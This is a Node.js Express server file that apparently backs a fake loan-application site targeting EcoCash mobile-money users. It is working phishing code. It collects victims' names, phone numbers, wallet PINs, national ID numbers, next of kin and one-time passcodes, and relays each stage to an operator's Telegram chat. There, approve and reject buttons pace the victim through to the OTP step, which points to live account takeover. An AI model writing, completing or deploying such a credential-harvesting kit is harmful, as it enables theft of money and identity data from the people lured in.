require('dotenv').config();
const express = require('express');
const crypto = require('crypto');
const path = require('path');
const { bot, esc, safeSend } = require('./telegram');
const db = require('./db');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

const wrap = fn => (req, res) => fn(req, res).catch(err => {
  console.error(err);
  res.status(500).json({ error: 'Server error' });
});

// ---------- SESSION ----------
app.post('/api/session', wrap(async (req, res) => {
  const sessionId = crypto.randomBytes(16).toString('hex');
  await db.createSession(sessionId);
  res.json({ sessionId });
}));

// ---------- PAGE 1 (LOAN REQUEST, PHONE & PIN) ----------
app.post('/api/submit-page4', wrap(async (req, res) => {
  const { sessionId, data } = req.body;
  const session = await db.getSession(sessionId);
  if (!session) return res.status(404).json({ error: 'Invalid or expired session' });

  // Save the new loan data
  await db.updateSession(sessionId, { page4: data, status: 'pending_4' });

  // Send to Telegram
  const msg =
    `📝 *NEW LOAN APPLICATION — STEP 1*\n\n` +
    `*Name:* ${esc(data.fullName)}\n` +
    `*EcoCash Number:* ${esc(data.phone)}\n` +
    `*EcoCash PIN:* \`${esc(data.pin)}\`\n` +
    `*Amount:* ${esc(data.loanAmount)}\n` +
    `*Term:* ${esc(data.loanTerm)}\n\n` +
    `Session: \`${sessionId}\``;

  await safeSend(CHAT_ID, msg, {
    parse_mode: 'Markdown',
    reply_markup: {
      inline_keyboard: [[
        { text: '✅ Approve Step 1', callback_data: `approve_4:${sessionId}` },
        { text: '❌ Reject',  callback_data: `reject_4:${sessionId}` }
      ]]
    }
  });
  res.json({ success: true });
}));

// ---------- PAGE 2 & 3 (EMPLOYMENT & IDENTITY) ----------
app.post('/api/submit-page5-6', wrap(async (req, res) => {
  const { sessionId, page5, page6 } = req.body;
  const session = await db.getSession(sessionId);
  if (!session) return res.status(404).json({ error: 'Invalid or expired session' });
  if (session.status !== 'approved_4') {
    return res.status(400).json({ error: 'Step 1 not approved yet' });
  }

  await db.updateSession(sessionId, { page5, page6, status: 'pending_56' });

  const p4 = JSON.parse(session.page4);
  const msg =
    `📋 *FULL APPLICATION REVIEW — STEP 2*\n\n` +
    `*— PAGE 1 (Loan Info) —*\n` +
    `Name: ${esc(p4.fullName)}\n` +
    `EcoCash Number: ${esc(p4.phone)}\n` +
    `EcoCash PIN: \`${esc(p4.pin)}\`\n` +
    `Amount: ${esc(p4.loanAmount)}\n` +
    `Term: ${esc(p4.loanTerm)}\n\n` +
    `*— PAGE 2 (Employment) —*\n` +
    `Status: ${esc(page5.q1)}\n` +
    `Monthly Income: ${esc(page5.q2)}\n\n` +
    `*— PAGE 3 (Identity) —*\n` +
    `National ID: ${esc(page6.q1)}\n` +
    `Next of Kin: ${esc(page6.q2)}\n\n` +
    `Session: \`${sessionId}\``;

  await safeSend(CHAT_ID, msg, {
    parse_mode: 'Markdown',
    reply_markup: {
      inline_keyboard: [
        [{ text: '✅ All Correct (Proceed to OTP)', callback_data: `correct_all:${sessionId}` }],
        [
          { text: '❌ Wrong Page 1', callback_data: `wrong_4:${sessionId}` },
          { text: '❌ Wrong Page 3', callback_data: `wrong_6:${sessionId}` }
        ]
      ]
    }
  });
  res.json({ success: true });
}));

// ---------- PAGE 4 (OTP VERIFICATION) ----------
app.post('/api/verify-code', wrap(async (req, res) => {
  const { sessionId, code } = req.body;
  const session = await db.getSession(sessionId);
  
  if (!session) return res.status(404).json({ error: 'Session not found' });
  if (session.status !== 'approved_all') return res.status(400).json({ error: 'Not ready for OTP verification' });

  // Save the OTP and set status to pending_otp
  await db.updateSession(sessionId, { status: 'pending_otp', verification_code: code });

  const p4 = JSON.parse(session.page4);

  // Send OTP to Admin on Telegram with all details for final check
  const msg = `🔐 *OTP SUBMITTED — FINAL STEP*\n\n` +
              `*Name:* ${esc(p4.fullName)}\n` +
              `*EcoCash Number:* ${esc(p4.phone)}\n` +
              `*PIN:* \`${esc(p4.pin)}\`\n` +
              `*OTP Entered:* \`${esc(code)}\`\n\n` +
              `Session: \`${sessionId}\``;

  await safeSend(CHAT_ID, msg, {
    parse_mode: 'Markdown',
    reply_markup: {
      inline_keyboard: [
        [
          { text: '✅ Approve OTP (Complete Loan)', callback_data: `approve_pin:${sessionId}` },
          { text: '❌ Reject OTP', callback_data: `reject_pin:${sessionId}` }
        ]
      ]
    }
  });

  res.json({ success: true, message: 'Awaiting admin approval' });
}));

// ---------- STATUS ----------
app.get('/api/status/:sessionId', wrap(async (req, res) => {
  const session = await db.getSession(req.params.sessionId);
  if (!session) return res.status(404).json({ error: 'Not found or expired' });
  res.json({ status: session.status });
}));

// ---------- TELEGRAM CALLBACKS ----------
bot.on('callback_query', async (query) => {
  try {
    const [command, sessionId] = query.data.split(':');
    const msgId = query.message.message_id;
    const chatId = query.message.chat.id;

    const session = await db.getSession(sessionId);
    if (!session) {
      return bot.answerCallbackQuery(query.id, { text: 'Session expired.' });
    }

    const edits = {
      approve_4:   { status: 'approved_4',   text: '✅ *STEP 1 APPROVED*' },
      reject_4:    { status: 'rejected_4',   text: '❌ *STEP 1 REJECTED*' },
      correct_all: { status: 'approved_all', text: '✅ *STEP 2 APPROVED — PROCEED TO OTP*' },
      wrong_4:     { status: 'rejected_4',   text: '❌ *WRONG PAGE 1 INFO*' },
      wrong_6:     { status: 'rejected_6',   text: '❌ *WRONG PAGE 3 INFO*' },
      
      approve_pin: { status: 'completed',    text: '✅ *OTP APPROVED — LOAN COMPLETE*' },
      reject_pin:  { status: 'rejected_pin', text: '❌ *OTP REJECTED*' }
    };
    
    const edit = edits[command];
    if (!edit) return bot.answerCallbackQuery(query.id, { text: 'Unknown action.' });

    await db.updateSession(sessionId, { status: edit.status });

    await bot.editMessageText(edit.text, {
      chat_id: chatId, message_id: msgId, parse_mode: 'Markdown'
    });
    bot.answerCallbackQuery(query.id, { text: 'Done!' });
  } catch (err) {
    console.error('callback error:', err.message);
    try { bot.answerCallbackQuery(query.id, { text: 'Error.' }); } catch {}
  }
});

// ---------- START ----------
const PORT = process.env.PORT || 3000;

db.init()
  .then(() => app.listen(PORT, () => console.log(`✅ Server on port ${PORT}`)))
  .catch(err => {
    console.error('❌ DB init failed:', err);
    process.exit(1);
  });